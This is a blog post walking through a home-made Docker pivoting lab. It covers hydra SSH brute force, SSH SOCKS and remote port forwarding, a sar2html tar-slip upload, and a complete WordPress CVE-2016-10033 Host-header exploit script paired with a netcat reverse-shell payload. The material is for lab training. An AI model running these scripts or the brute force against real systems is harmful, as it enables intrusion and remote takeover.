---
layout: blog-detail
title:  "Docker: Creating a Pivoting Lab and Exploiting it"
date:  jul 03, 2022
categories: pivot
titleimage: docker.png
permalink: /blog/:title
excerpt_separator:  <!-- excerpt-end -->
---

## Pivoting...

<!-- excerpt-start --> You may be familiar with the concept of pivoting. Pivoting is the way to move from one compromised system<!-- excerpt-end --> to another system.
<br>

Suppose,
<br>
**"A"** has access to **"B"**.<br>
**"B"** has access to **"C"**.<br>
**"A"** does not have access to **"C"**.<br>

So how can we access **"C"** from **"A"**? Well, that's directly not possible so we use the concept of pivoting. **"A"** can use **"B"** as the foothold to get access to **"C"**.
**"A"** first compromises the system **"B"** then can use this machine as the launch point to attack the **"C"**. 

## Lab Creation Overview

To have some practises on pivoting I have created a lab in docker.

The figure below gives the overview of the network setup of the docker-compose files.
*Victim1* and *Victim2* are our targets.They both are on the same subnet *172.16.101.0/24*  while *Attacker* is on different subnet *172.16.100.0/24*.

Our helper machine  ( gateway machine ) is sitting on both sub-networks.

![ pivoting image ><](/assets/img/blog4-pivoting/1-overview.png)

&nbsp;

<span style="font-weight: bold; font-size: 2em;">Brief Overview of Docker Compose Files</span>

You can get the docker-compose files from my Github repo.

Github Link: [Repository](https://github.com/Cimihan123/Pivoting)

For this lab two networks  are created:- 

1. **attacker** -> having subnet *172.16.100.0/24*

2. **victim** -> having subnet *172.16.101.0/24*

By default, Docker uses bridge a driver. We are sticking with it although we can specify different network drivers.

![ subnet image ><](/assets/img/blog4-pivoting/2-subnet.png)
<p align="center" style="color:white;">Fig:  docker-compose-subnet.yml</p>


Notice *helper* container is built locally. This makes it easy to customize the base image.
This container is part of both networks: *attacker* and *victim*.

![ helper image ><](/assets/img/blog4-pivoting/3-helper.png)
<p align="center" style="color:white;" style="color:white;">Fig:  docker-compose.yml</p>

A base image is being pulled. I have enabled ssh root login. I don't recommend doing without proper security guidelines. XD

![ helper image ><](/assets/img/blog4-pivoting/4-helper-image.png)
<p align="center" style="color:white;">Fig:  helper.Dockerfile</p>

*attacker* is the part of the *attacker* subnet having an IP of *172.16.100.10*

![ attacker image ><](/assets/img/blog4-pivoting/5-attacker.png)
<p align="center" style="color:white;">Fig:  docker-compose.yml</p>

*attacker* container also uses the *phusion/baseimage*. Additionally, some other tools ( ping, nmap, etc ) will be installed.

![ attacker image ><](/assets/img/blog4-pivoting/5-attacker-image.png)
<p align="center" style="color:white;">Fig:  attacker.Dockerfile</p>

*victim* container is also built locally. It does have network IP *172.16.101.10*. This is the part of subnet *172.16.101.0/24*.

![ victim1 image ><](/assets/img/blog4-pivoting/6-victim1.png)
<p align="center" style="color:white;">Fig:  docker-compose.yml</p>

The **wget** downloads **sar2html** tool. Github Link: [Repository](https://github.com/cemtan/sar2html/).

It is the plotting tool for system statistics. There is an issue with this tool. We will discuss this later on. For now, just assume there is a vulnerability in this tool.

![ victim1 image ><](/assets/img/blog4-pivoting/6-victim1-image.png)
<p align="center" style="color:white;">Fig:  victim1.Dockerfile</p>

For *victim2* there is no need to manipulate the image locally. There is already a vulnerable WordPress in the docker hub. We just pull it from there. The below image shows the structure to configure the WordPress as we also need a database server. They are in the same sub-network so they can communicate with each other.

![ victim2 image ><](/assets/img/blog4-pivoting/7-victim2.png)
<p align="center" style="color:white;">Fig:  docker-compose.yml</p>

Plus we have **wp-cli** to configure the wordpress setup automatically.

![ victim2 wpcli ><](/assets/img/blog4-pivoting/7-victim2-1.png)
<p align="center" style="color:white;">Fig:  docker-compose.yml</p>


### Docker Compose Build and Run

As far now we have a brief overview of our lab environment. Now we run the docker-compose files and check them.

We first build them. It may take some time for pulling, download, and installing. Then we create and run the created containers.
```bash
docker-compose -f docker-compose-subnet.yml -f docker-compose.yml build
docker-compose -f docker-compose-subnet.yml -f docker-compose.yml up

```

&nbsp;

There is a total of 5 containers running. Once *Attacker*, *helper*, *victim1* and *victim2* (WordPress & MySQL) are running.

![ dockercomposeup image ><](/assets/img/blog4-pivoting/8-dockercompose.png)
<p align="center" style="color:white;">Fig:  docker-compose build & up</p>


*attacker* container can reach the *helper* network. You see the successful ping reply back from the *helper*. 

```bash
ping helper
```
![ pinging from attacher to helper image ><](/assets/img/blog4-pivoting/9-attacker-ping-helper.png)
<p align="center" style="color:white;">Fig:  Ping check from the attacker </p>

![ pinging from attacher to helper image ><](/assets/img/blog4-pivoting/9-attacker-ping-helper.png)
<p align="center" style="color:white;">Fig:  Ping check from the attacker </p>

I guess you can figure out the connections among containers from the below picture.

![ pinging from attacker to helper image ><](/assets/img/blog4-pivoting/10-pingall.png)
<p align="center" style="color:white;">Fig:  Ping check </p>


## Attacking and Pivoting

Let's first prefer discovering the ports in *helper* host. So our target is first to get access to the *helper* host.

```bash
nmap -sC -sV -T4 172.16.100.11
```
![ helper nmap scan ><](/assets/img/blog4-pivoting/11-nmap-helper.png)
<p align="center" style="color:white;">Fig: Nmap scan (helper) </p>

So there is port 22 (ssh) open. We have hydra installed in the attacker machine and a rockyou.txt file.
Brute forcing the ssh login.

```bash
hydra -l root -P /home/rock.txt ssh://172.16.100.11
```
&nbsp;

![ bruteforce ssh ><](/assets/img/blog4-pivoting/12-hydra.png)
<p align="center" style="color:white;">Fig: Bruteforce with Hydra </p>

We got the password for the user **root**. Let's try using this cred. So, we are now into the helper machine.

```bash
ssh root@172.16.100.11
```
&nbsp;

![  ssh login ><](/assets/img/blog4-pivoting/13-sshlogin.png)
<p align="center" style="color:white;">Fig: ssh login </p>

There might be new hosts so I am going to scan further to gather new hosts and ports.

*ifconfig* shows that the *helper* machine is part of two network families.

                                                    1. 172.16.100.11
                                                    2. 172.16.101.11

![  ifconfig ><](/assets/img/blog4-pivoting/15-ifconfig.png)
<p align="center" style="color:white;">Fig: ifconfig </p>

&nbsp;

```
hostname -I -> displays all the addresses for the host
```

![  hostname ><](/assets/img/blog4-pivoting/16-hostname.png)
<p align="center" style="color:white;">Fig: hostname </p>

&nbsp;

Having ssh access makes it very easy for tunneling. Creating dynamically port forwarding leverages the SOCKS proxy. This will deliver all the traffic through an ssh conncetion via given port to the destination server. Here we are forwarding all the traffics to the attacker machine.

**-N = disable execution of command**

**-f = runs in background**

```bash
ssh -D 9050 root@172.16.100.11 -f -N
```
![  dynamic ><](/assets/img/blog4-pivoting/17-ssh-dynamic.png)
<p align="center" style="color:white;">Fig:  dynamic port forwarding </p>

&nbsp;

Cross-checking if it is running in the background or not. XD

![  netstat ><](/assets/img/blog4-pivoting/17-1-netstat.png)
<p align="center" style="color:white;">Fig: netstat </p>

What we need now is a proxy tool. I am going to use *proxychains*. Remember the port we mentioned in "/etc/proxychains.conf" should be the same as a dynamic port.

![  proxychain ><](/assets/img/blog4-pivoting/18-proxychain.png)
<p align="center" style="color:white;">Fig: proxychain conf </p>

#### Discovering newer hosts (victims)

The major concern is finding hosts. Having a **map** would have been easier, but you won't find it mostly in real cases.

![  no nmap ><](/assets/img/blog4-pivoting/14-nonmap.png)
<p align="center" style="color:white;">Fig: no nmap </p>

We are aware now that *helper* is part of two networks. Both *helper* machine and *attacker* machine belong to the same network **"172.16.100.0/24"**. Due to this reason, we are now going to scan the network **"172.16.101.0/24"** to find all live hosts.

I am using the **ping sweep** technique to scan new hosts. The below one-liner code will run in parallel mode.

```bash
for i in $(seq 1 254); do (ping -c 1 172.16.101.${i} | grep "64 bytes from" | grep -oE "([0-9]{1,3}[\.]){3}[0-9]{1,3}" &); done;
```
![  ping scan hosts ><](/assets/img/blog4-pivoting/19-loop-ping.png)
<p align="center" style="color:white;">Fig: Host scan using ping </p>

We have now gathered total of 5 live hosts.

**1. 172.16.101.11 - helper ip**<br>
**2. 172.16.101.3  - gateway ip**<br>
**3. 172.16.101.20 - victim1 ip**<br>
**4. 172.16.101.21 - victim2 ip**<br>
**5. 172.16.101.22 - victim2 ip**<br>
<br>

<span style="font-weight: bold; font-size: 2em;">Victim 1</span>

The reason why we cannot ping is that proxies do not support **ICMP** protocols. Their working OSI layers are different.
![  not working  ><](/assets/img/blog4-pivoting/20-proxy-ping-notworking.png)
<p align="center" style="color:white;">Fig: Proxymap ping </p>

We cannot ping the hosts however we can use Nmap to scan ports.

```bash
proxychains nmap -sT -Pn -F 172.16.101.20
```
 	

**-sT - TCP connect scan**<br>
* **-Pn - won't scan hosts but treats all hosts as online**

Nmap shows that one service is open on port 5000.

![  nmap victim1  ><](/assets/img/blog4-pivoting/21-nmap.png)
<p align="center" style="color:white;">Fig: Nmap scan (victim1) </p>

We have a 200 status code.
![  curl  ><](/assets/img/blog4-pivoting/22-curl.png)
<p align="center" style="color:white;">Fig: Curl </p>

Let's see what is running in this port. Opening it in a browser.
> **sar2html** is the plotting tool for system statistics (sar data). 

![  sar2html  ><](/assets/img/blog4-pivoting/23-sar2html.png)
<p align="center" style="color:white;">Fig: Sar2html </p>

As I said at the beginning of this blog there is a vulnerability in this tool. Actually, there is a **tar2slip** vulnerability.
>**sar2html** is vulnerable to tar slip which leads to arbitrary file write via archive extraction.

Let's just try exploiting it.

**1. First download the POC generator tool**
```bash
git clone https://github.com/ptoomey3/evilarc.git && cd evilarc  
```
**2. Run the below code**
```bash
echo exploitation test > test.css 
```
**3. Now generate the malicious tar file**
```bash
python2 evilarc.py  -o linux -f pay.tar test.css -p 'static/css' -d 3
```
**4. Click on "New Host" then upload the tar file "pay.tar"**

**5. Check for the file.**

![  file.css check  ><](/assets/img/blog4-pivoting/24-testcss.png)
<p align="center" style="color:white;">Fig: Using Browser </p>

![  file.css check using curl  ><](/assets/img/blog4-pivoting/24-testcss1.png)
<p align="center" style="color:white;">Fig: Using Curl</p>
<br>
We have successfully exploited this issue.
<br>

**Victim1 is compromised**.

<br>

<span style="font-weight: bold; font-size: 2em;">Victim 2</span>

Again we start with the same tedious *Nmap* scan. There is an http service running on port 80.

![  wordpress nmap  ><](/assets/img/blog4-pivoting/25-victim-nmap.png)
<p align="center" style="color:white;">Fig: Nmap scan (victim2)</p>

Here we see MySQL service running on.

![  mysql nmap  ><](/assets/img/blog4-pivoting/25-victim-nmap-mysql.png)
<p align="center" style="color:white;">Fig: Nmap scan (victim2)</p>

For now, our target is HTTP service. Seems like it is running WordPress cms.

![  curl victim2  ><](/assets/img/blog4-pivoting/26-victim2-wp-curl.png)
<p align="center" style="color:white;">Fig: Check</p>

If we have not automated the installation process with **wp-cli** then we should have first finished the wordpress installation process manually.

To know more about this vulnerability in WordPress, you can [Click Me](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html).


It is already configured and installed. The username and password for wp-admin are **"admin"** and **"adminpass"** respectively.

![  wordpress installation  ><](/assets/img/blog4-pivoting/install.png)
<p align="center" style="color:white;">Fig: Wordpress Installation</p>

Save the below reverses shell payload.

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.101.11 1331 >/tmp/f
```

<p align="center" style="color:white;">rev.sh</p>

Now save the below POC. Check if you have set the correct http_server and target.

```bash
#!/bin/bash

function prep_host_header() {
      cmd="$1"
      rce_cmd="\${run{$cmd}}";
      rce_cmd="`echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"
      rce_cmd="`echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"
      host_header="target(any -froot@localhost -be $rce_cmd null)"
      return 0
}

if [ "$#" -ne 1 ]; then
echo -e "Usage:\n$0 target-wordpress-url\n"
exit 1
fi
target="$1"
http_server="172.16.101.11/rev.sh"

# Save payload on the target in /tmp/rev.sh
cmd="/usr/bin/curl $http_server -o /tmp/rev.sh"
prep_host_header "$cmd"
curl -H "Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
echo -e "\n\e[92m[+]\e[0m Payload sent successfully"

# get a reverse shell
cmd="/bin/chmod +x /tmp/rev.sh"
prep_host_header "$cmd"
curl -H "Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
echo -e "\n\e[92m[+]\e[0m Payload sent successfully"

cmd="/bin/sh /tmp/rev.sh"
prep_host_header "$cmd"
curl -H "Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
echo -e "\n\e[92m[+]\e[0m Payload sent successfully"
```
<p align="center" style="color:white;">poc.sh</p>

![  poc.sh  ><](/assets/img/blog4-pivoting/29-poc.png)
<p align="center" style="color:white;">Fig: poc.sh</p>

<span style="font-weight: bold; font-size: 2em;">Testing</span>

So before executing the POC file we have to first ensure that everything is working properly. Getting reverse shell directly from **victim2** machine to **attacker** machine is not possible. Although we have running dynamic port forwarding it is still not going to work.

![ check  ><](/assets/img/blog4-pivoting/30-nonc.png)

<br>

**poc.sh** file downloads the **rev.sh** from the **attacker** machine to the **victim2** machine. But it is not making a connection with the **HTTP server**.

![ check  ><](/assets/img/blog4-pivoting/31-norev.png)


<span style="font-weight: bold; font-size: 2em;">Reverse Shell</span>

Let's use the remote port forwarding concept here.
```bash
ssh -R :80:172.16.100.10:80 root@helper -N -f
```

This will forward all the traffic (creating a tunnel) from the remote port (**victim2**) 80 to the local machine on port 80 (**attacker**).
Now when we run the **poc.sh** file, it can make a connection with the attacker python HTTP server. Let's apply this.

![  download rev.sh  ><](/assets/img/blog4-pivoting/32-download.png)
<p align="center" style="color:white;">Fig: downloading rev.sh</p>

We are now one step away from getting a reverse shell.Again we remote port forward.

```bash
ssh -R :80:172.16.100.10:80 -R :1331:172.16.100.10:1331 root@helper -N -f
proxychains4 -q ./poc.sh 172.16.101.21
python3 -m http.server 80
ncat -lvnp 1331
```

![  Getting reverse shell  ><](/assets/img/blog4-pivoting/32-revshell.png)
<p align="center" style="color:white;">Fig: Reverse Shell</p>

Finally, we are into the vulnerable WordPress machine.

<span style="font-weight: bold; font-size: 2em;">Caveat</span>

By default, ssh disables **GatewayPorts**.It would make any remote IP only bind to 127.0.0.1:\<port\> and allows to connect only from the server host.

![  Explain  ><](/assets/img/blog4-pivoting/32-explain.png)

**1. When GatewayPorts is disbaled**

![  GatewayPorts off  ><](/assets/img/blog4-pivoting/33-gatewayports.png)
<p align="center" style="color:white;">Fig: GatewayPorts no</p>

**2. When GatewayPorts is enabled**

![  GatewayPorts on  ><](/assets/img/blog4-pivoting/33-gatewayportson.png)
<p align="center" style="color:white;">Fig: GatewayPorts yes</p>

Thank you :)